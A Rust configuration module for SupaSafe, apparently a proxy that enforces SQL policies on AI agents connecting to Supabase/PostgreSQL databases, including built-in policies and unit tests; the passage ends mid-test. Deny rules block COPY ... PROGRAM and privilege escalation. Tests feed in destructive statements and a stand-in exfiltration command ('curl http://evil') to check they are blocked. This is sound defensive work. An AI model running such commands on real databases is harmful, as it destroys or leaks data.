//! Configuration: `supasafe.toml`.
//!
//! SupaSafe works with no configuration at all. The defaults are the ones you
//! would write yourself after an incident: production is an allow-list,
//! Supabase's managed schemas are off limits, and anything SupaSafe cannot
//! parse is refused rather than waved through.

use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use crate::environment::{detect, ConnectionTarget, DetectionInputs, Environment, EnvironmentInfo};
use crate::policy::{CompiledPolicy, Policy, PolicyError, Rule};

/// Where the proxy listens and what it forwards to.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct ProxyConfig {
    /// Address agents connect to.
    pub listen: String,
    /// The real PostgreSQL server, as `host:port`. When empty, the target is
    /// taken from the client's connection instead.
    pub upstream: String,
    /// Offer TLS to connecting clients. Requires `tls_cert` and `tls_key`.
    pub tls_cert: Option<PathBuf>,
    pub tls_key: Option<PathBuf>,
    /// Require TLS on the connection to the upstream database.
    pub upstream_tls: bool,
    /// Pin the upstream certificate to this PEM file. When set, SupaSafe will
    /// not talk to a server presenting any other certificate.
    pub upstream_ca: Option<PathBuf>,
    /// Seconds a client may stay idle before the proxy closes the connection.
    pub idle_timeout_seconds: u64,
    /// A read-only connection string SupaSafe uses for its own catalogue
    /// lookups, row estimates and EXPLAIN. Without it, blast radius analysis
    /// falls back to static estimates.
    pub introspection_url: Option<String>,
}

impl Default for ProxyConfig {
    fn default() -> Self {
        Self {
            listen: "127.0.0.1:6432".to_string(),
            upstream: String::new(),
            tls_cert: None,
            tls_key: None,
            upstream_tls: true,
            upstream_ca: None,
            idle_timeout_seconds: 3600,
            introspection_url: None,
        }
    }
}

/// The dashboard and approval API.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct ServerConfig {
    pub listen: String,
    /// Open the dashboard in a browser when `supasafe start` runs.
    pub open_browser: bool,
    /// Allow policy rules to be changed from the dashboard.
    ///
    /// On by default, because tuning a rule you cannot try out is guesswork.
    /// Turn it off if you expose the dashboard beyond loopback: an edit here
    /// changes what the proxy lets through, immediately.
    pub allow_policy_editing: bool,
}

impl Default for ServerConfig {
    fn default() -> Self {
        Self {
            listen: "127.0.0.1:7717".to_string(),
            open_browser: false,
            allow_policy_editing: true,
        }
    }
}

/// The audit trail.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct AuditConfig {
    /// Append-only, hash-chained log file.
    pub path: PathBuf,
    /// Store the statement text as written, including literal values.
    ///
    /// Off by default. With it off, SupaSafe records the normalised statement
    /// (`WHERE email = ?`) so the audit trail never becomes a second copy of
    /// your customer data.
    pub store_raw_sql: bool,
    /// Also write each record to stdout as JSON, for shipping to a log
    /// pipeline.
    pub stdout_json: bool,
}

impl Default for AuditConfig {
    fn default() -> Self {
        Self {
            path: default_state_dir().join("audit.jsonl"),
            store_raw_sql: false,
            stdout_json: false,
        }
    }
}

/// Approval behaviour.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct ApprovalConfig {
    /// How long a request waits before it is refused, in seconds.
    pub timeout_seconds: u64,
    /// Allow the approver to submit edited SQL in place of what the agent
    /// wrote.
    pub allow_edit: bool,
    /// Refuse an approval that comes from the same identity that made the
    /// request.
    pub require_distinct_approver: bool,
}

impl Default for ApprovalConfig {
    fn default() -> Self {
        Self {
            timeout_seconds: 300,
            allow_edit: true,
            require_distinct_approver: true,
        }
    }
}

/// Snapshots taken before dangerous statements.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct SnapshotConfig {
    pub directory: PathBuf,
    /// Path to `pg_dump`. SupaSafe shells out to it for logical dumps.
    pub pg_dump_path: String,
    /// Take a table-level dump rather than a whole-database dump when the
    /// statement names specific tables.
    pub prefer_table_scope: bool,
    /// Give up on a snapshot after this many seconds rather than holding the
    /// statement forever.
    pub timeout_seconds: u64,
}

impl Default for SnapshotConfig {
    fn default() -> Self {
        Self {
            directory: default_state_dir().join("snapshots"),
            pg_dump_path: "pg_dump".to_string(),
            prefer_table_scope: true,
            timeout_seconds: 900,
        }
    }
}

/// A database SupaSafe knows about by name.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct DatabaseConfig {
    /// A label for dashboards and audit records.
    pub name: String,
    /// Match on host name. Supports `*` globs.
    pub host: Option<String>,
    /// Match on database name.
    pub database: Option<String>,
    /// Match on Supabase project reference.
    pub project_ref: Option<String>,
    /// Declare the environment outright.
    pub environment: Option<Environment>,
    /// Use this policy instead of the environment's default.
    pub policy: Option<String>,
}

impl DatabaseConfig {
    fn matches(&self, target: &ConnectionTarget, project_ref: Option<&str>) -> bool {
        let mut matched_any = false;
        if let Some(pattern) = &self.host {
            if !glob_match(pattern, &target.host) {
                return false;
            }
            matched_any = true;
        }
        if let Some(db) = &self.database {
            if !db.eq_ignore_ascii_case(&target.database) {
                return false;
            }
            matched_any = true;
        }
        if let Some(reference) = &self.project_ref {
            match project_ref {
                Some(actual) if reference.eq_ignore_ascii_case(actual) => matched_any = true,
                _ => return false,
            }
        }
        matched_any
    }
}

/// A `*`-only glob, which is all a host pattern needs.
fn glob_match(pattern: &str, value: &str) -> bool {
    let pattern = pattern.to_ascii_lowercase();
    let value = value.to_ascii_lowercase();
    let mut parts = pattern.split('*');
    let first = parts.next().unwrap_or("");
    if !value.starts_with(first) {
        return false;
    }
    let mut idx = first.len();
    let mut last = first;
    for part in parts {
        last = part;
        match value[idx..].find(part) {
            Some(found) => idx += found + part.len(),
            None => return false,
        }
    }
    if !pattern.ends_with('*') && !last.is_empty() {
        return value.ends_with(last);
    }
    true
}

/// The AI context SupaSafe injects into agent sessions.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct ContextConfig {
    /// Add SupaSafe's standing instructions to the context it serves agents.
    pub enabled: bool,
    /// Extra project-specific instructions appended to the standard ones.
    pub extra_instructions: Vec<String>,
}

impl Default for ContextConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            extra_instructions: Vec::new(),
        }
    }
}

/// The whole configuration file.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct Config {
    pub proxy: ProxyConfig,
    pub server: ServerConfig,
    pub audit: AuditConfig,
    pub approvals: ApprovalConfig,
    pub snapshots: SnapshotConfig,
    pub context: ContextConfig,
    /// Project references the operator has declared to be production.
    pub production_project_refs: Vec<String>,
    #[serde(rename = "database")]
    pub databases: Vec<DatabaseConfig>,
    pub policies: BTreeMap<String, Policy>,
}

impl Default for Config {
    fn default() -> Self {
        Self {
            proxy: ProxyConfig::default(),
            server: ServerConfig::default(),
            audit: AuditConfig::default(),
            approvals: ApprovalConfig::default(),
            snapshots: SnapshotConfig::default(),
            context: ContextConfig::default(),
            production_project_refs: Vec::new(),
            databases: Vec::new(),
            policies: builtin_policies(),
        }
    }
}

/// Errors from loading configuration.
#[derive(Debug, thiserror::Error)]
pub enum ConfigError {
    #[error("could not read {path}: {source}")]
    Read {
        path: PathBuf,
        source: std::io::Error,
    },
    #[error("could not parse {path}: {source}")]
    Parse {
        path: PathBuf,
        source: toml::de::Error,
    },
    #[error("could not write {path}: {source}")]
    Write {
        path: PathBuf,
        source: std::io::Error,
    },
    #[error(transparent)]
    Policy(#[from] PolicyError),
}

impl Config {
    /// Load configuration from a file, filling in any policy the file did not
    /// define from the built-in set.
    pub fn load(path: &Path) -> Result<Config, ConfigError> {
        let text = std::fs::read_to_string(path).map_err(|e| ConfigError::Read {
            path: path.to_path_buf(),
            source: e,
        })?;
        Config::parse(&text).map_err(|source| ConfigError::Parse {
            path: path.to_path_buf(),
            source,
        })
    }

    /// Parse configuration from TOML text, resolving policy inheritance and
    /// filling in any built-in policy the text did not mention.
    ///
    /// This is the only path that turns text into a `Config`, so configuration
    /// typed into the dashboard behaves exactly like configuration read from
    /// disk. A second, subtly different parser is how a policy comes to mean
    /// one thing in a file and another over HTTP.
    pub fn parse(text: &str) -> Result<Config, toml::de::Error> {
        let mut config: Config = toml::from_str(text)?;

        // Which keys the text actually set, so inheritance can tell "left out"
        // from "set to the same value the default happens to have".
        let declared: toml::Table = toml::from_str(text)?;
        config.resolve_inheritance(&declared);

        for (name, policy) in builtin_policies() {
            config.policies.entry(name).or_insert(policy);
        }
        Ok(config)
    }

    /// Fill in anything a policy inherited from the one it extends.
    ///
    /// Without this, writing `[[policies.production.rules]]` to add a single
    /// rule would replace the whole production policy with a bare one whose
    /// default is `deny`. Every ordinary query would then be refused, which is
    /// safe but useless, and the cause would not be obvious.
    fn resolve_inheritance(&mut self, declared: &toml::Table) {
        let builtins = builtin_policies();
        let names: Vec<String> = self.policies.keys().cloned().collect();

        for name in names {
            // Only policies the text actually declared take part in
            // inheritance. Serde fills an absent `policies` table with the
            // built-in map, and merging those with themselves would list every
            // built-in rule twice for a file that never mentioned policies at
            // all.
            let declared_here = declared
                .get("policies")
                .and_then(|p| p.as_table())
                .map(|p| p.contains_key(&name))
                .unwrap_or(false);
            if !declared_here {
                continue;
            }

            let policy = &self.policies[&name];
            let base_name = policy.extends.clone().unwrap_or_else(|| name.clone());

            let Some(base) = builtins.get(&base_name) else {
                continue;
            };
            // A policy that neither names a base nor reuses a built-in name
            // stands alone.
            if policy.extends.is_none() && !builtins.contains_key(&name) {
                continue;
            }

            let set = declared
                .get("policies")
                .and_then(|p| p.as_table())
                .and_then(|p| p.get(&name))
                .and_then(|p| p.as_table());
            let was_set = |key: &str| set.map(|t| t.contains_key(key)).unwrap_or(false);

            let mut merged = base.clone();
            let own = self.policies[&name].clone();

            merged.name = name.clone();
            merged.extends = own.extends.clone();
            if was_set("description") {
                merged.description = own.description;
            }
            if was_set("default") {
                merged.default = own.default;
            }
            if was_set("warn_above") {
                merged.warn_above = own.warn_above;
            }
            if was_set("require_approval_above") {
                merged.require_approval_above = own.require_approval_above;
            }
            if was_set("deny_above") {
                merged.deny_above = own.deny_above;
            }
            if was_set("approvals_required") {
                merged.approvals_required = own.approvals_required;
            }
            if was_set("snapshot_above") {
                merged.snapshot_above = own.snapshot_above;
            }
            if was_set("dry_run_above") {
                merged.dry_run_above = own.dry_run_above;
            }
            if was_set("deny_unparsed") {
                merged.deny_unparsed = own.deny_unparsed;
            }
            if was_set("protect_managed_surfaces") {
                merged.protect_managed_surfaces = own.protect_managed_surfaces;
            }
            if was_set("approval_timeout_seconds") {
                merged.approval_timeout_seconds = own.approval_timeout_seconds;
            }

            merged.inherit_rules = own.inherit_rules;
            if own.inherit_rules {
                // The operator's rules go first: rules are ordered and the
                // first match wins, so this is what lets a local rule override
                // a built-in decision rather than sit behind it forever.
                let mut rules = own.rules;
                rules.extend(base.rules.iter().cloned());
                merged.rules = rules;
            } else {
                // The text already holds the complete list.
                merged.rules = own.rules;
            }

            self.policies.insert(name, merged);
        }
    }

    /// Look for configuration in the usual places.
    pub fn discover() -> Option<PathBuf> {
        let candidates = [
            PathBuf::from("supasafe.toml"),
            PathBuf::from(".supasafe.toml"),
            default_state_dir().join("supasafe.toml"),
        ];
        candidates.into_iter().find(|p| p.exists())
    }

    /// Load from the discovered path, or fall back to defaults.
    pub fn load_or_default() -> Result<Config, ConfigError> {
        match Config::discover() {
            Some(path) => Config::load(&path),
            None => Ok(Config::default()),
        }
    }

    /// Validate and compile every policy.
    pub fn compile(&self) -> Result<CompiledConfig, ConfigError> {
        let mut compiled = BTreeMap::new();
        for (name, policy) in &self.policies {
            let mut policy = policy.clone();
            policy.name = name.clone();
            compiled.insert(name.clone(), CompiledPolicy::compile(policy)?);
        }
        Ok(CompiledConfig {
            config: self.clone(),
            policies: compiled,
        })
    }

    /// Render the configuration as TOML, for `supasafe init`.
    pub fn to_toml(&self) -> String {
        toml::to_string_pretty(self).unwrap_or_default()
    }

    /// Write the configuration back to disk.
    ///
    /// Prefers writing to a temporary file and renaming it into place, so an
    /// interrupted save cannot leave a half-written policy behind. A truncated
    /// `supasafe.toml` is a proxy that refuses to start, and it would happen at
    /// exactly the moment somebody was editing rules under pressure.
    ///
    /// Falls back to writing in place when the rename cannot work. That is not
    /// hypothetical: bind-mounting a single config file into a container, which
    /// is how most people deploy one, makes the target a mount point and
    /// `rename` onto it fails with `EBUSY`.
    pub fn save(&self, path: &Path) -> Result<(), ConfigError> {
        // Refuse to persist something that would not load again.
        self.compile()?;

        // What is written is the resolved policy, rules and all. Mark it so
        // that loading it back does not merge the built-in rules in a second
        // time and leave every rule listed twice.
        let mut resolved = self.clone();
        for policy in resolved.policies.values_mut() {
            policy.inherit_rules = false;
        }

        if let Some(parent) = path.parent() {
            if !parent.as_os_str().is_empty() {
                std::fs::create_dir_all(parent).map_err(|e| ConfigError::Write {
                    path: parent.to_path_buf(),
                    source: e,
                })?;
            }
        }

        let mut text = String::from(
            "# SupaSafe configuration.\n\
             #\n\
             # Written by SupaSafe. Hand edits are preserved in meaning but not\n\
             # in formatting: saving from the dashboard rewrites this file.\n\n",
        );
        text.push_str(&resolved.to_toml());

        let temporary = path.with_extension("toml.tmp");
        match std::fs::write(&temporary, &text).and_then(|_| std::fs::rename(&temporary, path)) {
            Ok(()) => Ok(()),
            Err(rename_failed) => {
                // Never leave the half-written file lying next to the real one.
                let _ = std::fs::remove_file(&temporary);

                std::fs::write(path, &text).map_err(|in_place_failed| ConfigError::Write {
                    path: path.to_path_buf(),
                    // Report the error from writing the real file: it is the
                    // one that tells the operator what to fix, usually a
                    // permission or a read-only mount.
                    source: if in_place_failed.kind() == std::io::ErrorKind::PermissionDenied {
                        in_place_failed
                    } else {
                        rename_failed
                    },
                })
            }
        }
    }

    /// The policy by name, for editing.
    pub fn policy_mut(&mut self, name: &str) -> Option<&mut Policy> {
        self.policies.get_mut(name)
    }

    /// Add a rule to a policy.
    ///
    /// New rules go to the front by default, because rules are ordered and the
    /// first match wins. A rule appended to the end of the production policy
    /// would sit behind the catch-all and never fire, which is a confusing way
    /// to discover how the engine works.
    pub fn add_rule(
        &mut self,
        policy: &str,
        rule: Rule,
        at: Option<usize>,
    ) -> Result<(), EditError> {
        self.with_rules(policy, |rules| {
            let index = at.unwrap_or(0).min(rules.len());
            rules.insert(index, rule);
            Ok(())
        })
    }

    /// Replace a rule in place.
    pub fn update_rule(&mut self, policy: &str, index: usize, rule: Rule) -> Result<(), EditError> {
        let name = policy.to_string();
        self.with_rules(policy, |rules| {
            if index >= rules.len() {
                return Err(EditError::NoSuchRule {
                    policy: name,
                    index,
                });
            }
            rules[index] = rule;
            Ok(())
        })
    }

    /// Remove a rule.
    pub fn remove_rule(&mut self, policy: &str, index: usize) -> Result<Rule, EditError> {
        let name = policy.to_string();
        let mut removed = None;
        self.with_rules(policy, |rules| {
            if index >= rules.len() {
                return Err(EditError::NoSuchRule {
                    policy: name,
                    index,
                });
            }
            removed = Some(rules.remove(index));
            Ok(())
        })?;
        removed.ok_or_else(|| EditError::NoSuchRule {
            policy: policy.to_string(),
            index,
        })
    }

    /// Apply a change to a policy's rules, and keep it only if the result still
    /// compiles.
    ///
    /// The change is made to a copy. A rule with a bad glob leaves the
    /// configuration exactly as it was rather than sitting in it, invalid,
    /// waiting to fail the next time anything touches the policy.
    fn with_rules<F>(&mut self, policy: &str, change: F) -> Result<(), EditError>
    where
        F: FnOnce(&mut Vec<Rule>) -> Result<(), EditError>,
    {
        let existing = self
            .policies
            .get(policy)
            .ok_or_else(|| EditError::NoSuchPolicy(policy.to_string()))?;

        let mut candidate = existing.clone();
        candidate.name = policy.to_string();
        change(&mut candidate.rules)?;

        CompiledPolicy::compile(candidate.clone())
            .map_err(|e| EditError::Invalid(e.to_string()))?;

        self.policies.insert(policy.to_string(), candidate);
        Ok(())
    }

    /// Move a rule to a different position. Order is the whole semantics of the
    /// rule list, so this is a first-class operation rather than a delete and
    /// an insert.
    pub fn move_rule(&mut self, policy: &str, from: usize, to: usize) -> Result<(), EditError> {
        let target = self
            .policies
            .get_mut(policy)
            .ok_or_else(|| EditError::NoSuchPolicy(policy.to_string()))?;
        if from >= target.rules.len() {
            return Err(EditError::NoSuchRule {
                policy: policy.to_string(),
                index: from,
            });
        }
        let rule = target.rules.remove(from);
        let to = to.min(target.rules.len());
        target.rules.insert(to, rule);
        Ok(())
    }
}

/// Something wrong with an edit, reported before it is applied anywhere.
#[derive(Debug, thiserror::Error)]
pub enum EditError {
    #[error("no policy named {0:?}")]
    NoSuchPolicy(String),
    #[error("policy {policy:?} has no rule at position {index}")]
    NoSuchRule { policy: String, index: usize },
    #[error("{0}")]
    Invalid(String),
}

/// Configuration with policies compiled and ready to evaluate.
#[derive(Debug, Clone)]
pub struct CompiledConfig {
    pub config: Config,
    policies: BTreeMap<String, CompiledPolicy>,
}

impl CompiledConfig {
    /// Work out the environment for a connection, taking configured databases
    /// into account.
    pub fn classify(&self, target: &ConnectionTarget) -> EnvironmentInfo {
        let project_ref = target.supabase_project_ref();
        let entry = self
            .config
            .databases
            .iter()
            .find(|d| d.matches(target, project_ref.as_deref()));

        let inputs = DetectionInputs {
            target: target.clone(),
            env_vars: DetectionInputs::from_process_env(target.clone()).env_vars,
            configured: entry.and_then(|e| e.environment),
            label: entry.map(|e| e.name.clone()),
            production_project_refs: self.config.production_project_refs.clone(),
        };
        detect(&inputs)
    }

    /// The policy that governs a connection.
    pub fn policy_for(&self, info: &EnvironmentInfo) -> &CompiledPolicy {
        let named = self
            .config
            .databases
            .iter()
            .find(|d| Some(&d.name) == info.label.as_ref())
            .and_then(|d| d.policy.as_ref())
            .and_then(|name| self.policies.get(name));

        named
            .or_else(|| self.policies.get(info.environment.default_policy()))
            // A configuration that somehow has no policy for this environment
            // must not fail open.
            .unwrap_or_else(|| {
                self.policies
                    .get("production")
                    .expect("the production policy is always present")
            })
    }

    pub fn policy(&self, name: &str) -> Option<&CompiledPolicy> {
        self.policies.get(name)
    }

    pub fn policy_names(&self) -> Vec<&str> {
        self.policies.keys().map(|s| s.as_str()).collect()
    }

    pub fn policies(&self) -> impl Iterator<Item = &CompiledPolicy> {
        self.policies.values()
    }
}

/// `~/.supasafe`, or the current directory if there is no home.
pub fn default_state_dir() -> PathBuf {
    match std::env::var_os("SUPASAFE_HOME") {
        Some(dir) => PathBuf::from(dir),
        None => match std::env::var_os("HOME") {
            Some(home) => PathBuf::from(home).join(".supasafe"),
            None => PathBuf::from(".supasafe"),
        },
    }
}

fn rule(name: &str, action: &str, message: &str, when: crate::policy::Matcher) -> Rule {
    Rule {
        name: name.to_string(),
        action: action.to_string(),
        approvals: None,
        message: Some(message.to_string()),
        when,
    }
}

/// The policies SupaSafe ships with.
pub fn builtin_policies() -> BTreeMap<String, Policy> {
    use crate::policy::Matcher;
    let mut policies = BTreeMap::new();

    // --- development: get out of the way -----------------------------------
    policies.insert(
        "development".to_string(),
        Policy {
            name: "development".into(),
            description: "Local and development databases. Everything is allowed and everything \
                          is recorded."
                .into(),
            default: "allow".into(),
            warn_above: Some(80),
            deny_unparsed: false,
            protect_managed_surfaces: false,
            ..Default::default()
        },
    );

    // --- staging: allow, but say something ---------------------------------
    policies.insert(
        "staging".to_string(),
        Policy {
            name: "staging".into(),
            description: "Pre-production. Destructive work is allowed but flagged, and the \
                          irreversible operations still need a human."
                .into(),
            default: "allow".into(),
            warn_above: Some(25),
            // Staging warns rather than gates: the point of staging is that
            // people can break it. Protected managed surfaces and command
            // execution are still refused below.
            require_approval_above: None,
            deny_unparsed: false,
            protect_managed_surfaces: true,
            snapshot_above: Some(90),
            rules: vec![rule(
                "no-command-execution",
                "deny",
                "COPY ... PROGRAM runs a shell command on the database host. SupaSafe never \
                 allows it, in any environment.",
                Matcher {
                    any_flags: vec!["copy_program".into()],
                    ..Default::default()
                },
            )],
            ..Default::default()
        },
    );

    // --- production: allow-list --------------------------------------------
    policies.insert(
        "production".to_string(),
        Policy {
            name: "production".into(),
            description: "Production. Nothing runs unless a rule allows it, and the operations \
                          that cannot be undone need a human being."
                .into(),
            default: "deny".into(),
            require_approval_above: None,
            deny_above: None,
            approvals_required: 1,
            snapshot_above: Some(80),
            dry_run_above: Some(50),
            deny_unparsed: true,
            protect_managed_surfaces: true,
            approval_timeout_seconds: 300,
            rules: vec![
                rule(
                    "no-command-execution",
                    "deny",
                    "COPY ... PROGRAM runs a shell command on the database host. This is remote \
                     code execution, not a database operation, and SupaSafe never allows it.",
                    Matcher {
                        any_flags: vec!["copy_program".into()],
                        ..Default::default()
                    },
                ),
                rule(
                    "no-privilege-escalation",
                    "deny",
                    "Granting SUPERUSER, BYPASSRLS or REPLICATION removes every other safety \
                     boundary in the database, including this one.",
                    Matcher {
                        any_flags: vec!["grants_elevated_role".into()],
                        ..Default::default()
                    },
                ),
                rule(
                    "allow-reads",
                    "allow",
                    "Reads do not change anything.",
                    Matcher {
                        categories: vec!["read".into()],
                        ..Default::default()
                    },
                ),
                rule(
                    "allow-transaction-control",
                    "allow",
                    "Transaction and session control statements are not changes in themselves.",
                    Matcher {
                        categories: vec!["transaction".into(), "session".into()],
                        ..Default::default()
                    },
                ),
                rule(
                    "irreversible-operations-need-a-human",
                    "require_approval",
                    "This operation cannot be undone from inside the database. A person has to \
                     agree to it.",
                    Matcher {
                        kinds: vec![
                            "drop_database".into(),
                            "drop_schema".into(),
                            "drop_table".into(),
                            "truncate".into(),
                            "drop_role".into(),
                        ],
                        ..Default::default()
                    },
                ),
                rule(
                    "unfiltered-writes-need-a-human",
                    "require_approval",
                    "This statement has no effective WHERE clause, so it rewrites or deletes \
                     every row in the table.",
                    Matcher {
                        kinds: vec!["update".into(), "delete".into()],
                        unfiltered: Some(true),
                        ..Default::default()
                    },
                ),
                rule(
                    "destructive-schema-changes-need-a-human",
                    "require_approval",
                    "Dropping a column, changing ownership or weakening row level security \
                     cannot be reversed by re-running a migration.",
                    Matcher {
                        any_flags: vec![
                            "drops_column".into(),
                            "changes_owner".into(),
                            "weakens_rls".into(),
                            "drops_constraint".into(),
                            "disables_trigger".into(),
                        ],
                        ..Default::default()
                    },
                ),
                rule(
                    "allow-inserts",
                    "allow",
                    "Adding rows is additive: nothing existing is lost.",
                    Matcher {
                        kinds: vec!["insert".into()],
                        max_risk: Some(49),
                        ..Default::default()
                    },
                ),
                rule(
                    "allow-scoped-writes",
                    "allow",
                    "A write with a real row filter and a modest blast radius is ordinary \
                     application traffic.",
                    Matcher {
                        kinds: vec!["update".into(), "delete".into(), "merge".into()],
                        unfiltered: Some(false),
                        max_risk: Some(49),
                        ..Default::default()
                    },
                ),
                rule(
                    "schema-changes-need-a-human",
                    "require_approval",
                    "Schema changes in production belong in a migration. If this one is \
                     intentional, approve it and it will be recorded.",
                    Matcher {
                        categories: vec!["ddl".into(), "dcl".into()],
                        ..Default::default()
                    },
                ),
                rule(
                    "everything-else-needs-a-human",
                    "require_approval",
                    "SupaSafe has no rule that allows this statement in production.",
                    Matcher::default(),
                ),
            ],
            ..Default::default()
        },
    );

    // --- regulated: two people, always -------------------------------------
    policies.insert(
        "regulated".to_string(),
        Policy {
            name: "regulated".into(),
            description: "For databases under an audit regime. Two approvers, a snapshot before \
                          anything destructive, and a dry run before anything wide."
                .into(),
            default: "deny".into(),
            approvals_required: 2,
            snapshot_above: Some(40),
            dry_run_above: Some(25),
            deny_unparsed: true,
            protect_managed_surfaces: true,
            approval_timeout_seconds: 1800,
            rules: vec![
                rule(
                    "no-command-execution",
                    "deny",
                    "COPY ... PROGRAM is never allowed.",
                    Matcher {
                        any_flags: vec!["copy_program".into()],
                        ..Default::default()
                    },
                ),
                rule(
                    "no-privilege-escalation",
                    "deny",
                    "Privilege escalation is never allowed.",
                    Matcher {
                        any_flags: vec!["grants_elevated_role".into()],
                        ..Default::default()
                    },
                ),
                rule(
                    "no-irreversible-loss",
                    "deny",
                    "Under this policy, operations that destroy data outright are refused. Use a \
                     reviewed migration instead.",
                    Matcher {
                        kinds: vec![
                            "drop_database".into(),
                            "drop_schema".into(),
                            "truncate".into(),
                        ],
                        ..Default::default()
                    },
                ),
                rule(
                    "allow-reads",
                    "allow",
                    "Reads do not change anything.",
                    Matcher {
                        categories: vec!["read".into()],
                        ..Default::default()
                    },
                ),
                rule(
                    "allow-transaction-control",
                    "allow",
                    "Transaction control is not a change.",
                    Matcher {
                        categories: vec!["transaction".into(), "session".into()],
                        ..Default::default()
                    },
                ),
                rule(
                    "everything-else-needs-two-people",
                    "require_approval",
                    "This policy requires two separate approvers for every change.",
                    Matcher::default(),
                ),
            ],
            ..Default::default()
        },
    );

    policies
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::policy::{Decision, MatchContext};
    use crate::risk::{score, RiskInput};
    use supasafe_parser::analyze_statement;

    fn decide(policy_name: &str, sql: &str) -> Decision {
        let compiled = Config::default().compile().expect("compiles");
        let policy = compiled.policy(policy_name).expect("policy exists");
        let stmt = analyze_statement(sql);
        let risk = score(&stmt, &RiskInput::default());
        policy
            .evaluate(&MatchContext {
                statement: &stmt,
                risk: &risk,
                environment: Environment::Production,
                agent: None,
            })
            .decision
    }

    #[test]
    fn the_default_config_compiles() {
        Config::default()
            .compile()
            .expect("default config compiles");
    }

    #[test]
    fn the_default_config_round_trips_through_toml() {
        let text = Config::default().to_toml();
        let parsed: Config = toml::from_str(&text).expect("round trips");
        parsed.compile().expect("still compiles");
    }

    #[test]
    fn production_allows_reads() {
        assert_eq!(decide("production", "SELECT * FROM users"), Decision::Allow);
    }

    #[test]
    fn production_allows_ordinary_scoped_writes() {
        assert_eq!(
            decide("production", "UPDATE users SET name = $1 WHERE id = $2"),
            Decision::Allow
        );
        assert_eq!(
            decide("production", "INSERT INTO events (id) VALUES ($1)"),
            Decision::Allow
        );
    }

    #[test]
    fn production_stops_the_incident() {
        // The statement from the README.
        assert_eq!(
            decide("production", "DROP TABLE users"),
            Decision::RequireApproval { approvals: 1 }
        );
        assert_eq!(
            decide("production", "DELETE FROM users"),
            Decision::RequireApproval { approvals: 1 }
        );
        assert_eq!(
            decide("production", "TRUNCATE TABLE orders"),
            Decision::RequireApproval { approvals: 1 }
        );
        assert_eq!(
            decide("production", "UPDATE users SET is_admin = true"),
            Decision::RequireApproval { approvals: 1 }
        );
    }

    #[test]
    fn production_never_allows_command_execution_or_escalation() {
        assert_eq!(
            decide("production", "COPY users TO PROGRAM 'curl http://evil'"),
            Decision::Deny
        );
        assert_eq!(
            decide("production", "ALTER ROLE app WITH SUPERUSER"),
            Decision::Deny
        );
    }

    #[test]
    fn production_refuses_to_touch_supabase_auth() {
        assert_eq!(
            decide("production", "DROP TABLE auth.users"),
            Decision::Deny
        );
        assert_eq!(
            decide("production", "DELETE FROM auth.sessions WHERE id = $1"),
            Decision::Deny
        );
    }

    #[test]
    fn development_gets_out_of_the_way() {
        // Development never holds anything up. A DROP is still recorded as
        // worth noticing, which is what Warn means.
        assert_eq!(decide("development", "DROP TABLE users"), Decision::Warn);
        assert_eq!(
            decide("development", "UPDATE users SET x = 1 WHERE id = 1"),
            Decision::Allow
        );
        assert!(!decide("development", "DO $$ BEGIN PERFORM 1; END $$").blocks_execution());
        assert!(!decide("development", "TRUNCATE TABLE orders").blocks_execution());
    }

    #[test]
    fn staging_warns_rather_than_blocks() {
        assert_eq!(
            decide("staging", "DELETE FROM users WHERE id = 1"),
            Decision::Allow
        );
        assert_eq!(
            decide("staging", "ALTER TABLE users DROP COLUMN email"),
            Decision::Warn
        );
    }

    #[test]
    fn regulated_requires_two_people() {
        assert_eq!(
            decide("regulated", "ALTER TABLE users ADD COLUMN nickname text"),
            Decision::RequireApproval { approvals: 2 }
        );
        assert_eq!(decide("regulated", "TRUNCATE TABLE orders"), Decision::Deny);
    }

    #[test]
    fn every_environment_resolves_to_a_policy() {
        let compiled = Config::default().compile().unwrap();
        for env in [
            Environment::Local,
            Environment::Development,
            Environment::Staging,
            Environment::Production,
        ] {
            let info = EnvironmentInfo {
                environment: env,
                confidence: crate::environment::Confidence::Certain,
                signals: vec![],
                target: ConnectionTarget::default(),
                supabase_project_ref: None,
                assumed: false,
                label: None,
            };
            assert!(!compiled.policy_for(&info).name().is_empty());
        }
    }

    #[test]
    fn configured_databases_select_their_policy() {
        let mut config = Config::default();
        config.databases.push(DatabaseConfig {
            name: "acme-prod".into(),
            host: Some("db.*.supabase.co".into()),
            environment: Some(Environment::Production),
            policy: Some("regulated".into()),
            ..Default::default()
        });
        let compiled = config.compile().unwrap();
        let target = ConnectionTarget::new("db.abcdefghijklmnopqrst.supabase.co", 5432, "postgres");
        let info = compiled.classify(&target);
        assert_eq!(info.environment, Environment::Production);
        assert_eq!(compiled.policy_for(&info).name(), "regulated");
    }

    fn load_from_str(text: &str) -> Config {
        let mut path = std::env::temp_dir();
        path.push(format!(
            "supasafe-config-test-{}-{:p}.toml",
            std::process::id(),
            text
        ));
        std::fs::write(&path, text).unwrap();
        let config = Config::load(&path).expect("loads");
        let _ = std::fs::remove_file(&path);
        config
    }

    #[test]
    fn adding_a_rule_to_a_builtin_policy_keeps_the_builtin_rules() {
        // The trap this guards: writing one rule under [policies.production]
        // must not replace the twelve rules that were already there and leave
        // a bare deny-everything policy behind.
        let config = load_from_str(
            r#"
            [[policies.production.rules]]
            name = "billing-is-off-limits"
            action = "deny"
            when = { objects = ["billing.*"] }
            "#,
        );
        let production = &config.policies["production"];
        assert!(production.rules.len() > 5, "built-in rules were discarded");
        assert_eq!(production.rules[0].name, "billing-is-off-limits");
        assert_eq!(production.default, "deny");
        assert!(production.protect_managed_surfaces);

        // Ordinary traffic still flows.
        let compiled = config.compile().unwrap();
        let policy = compiled.policy("production").unwrap();
        let stmt = analyze_statement("SELECT * FROM users");
        let risk = score(&stmt, &RiskInput::default());
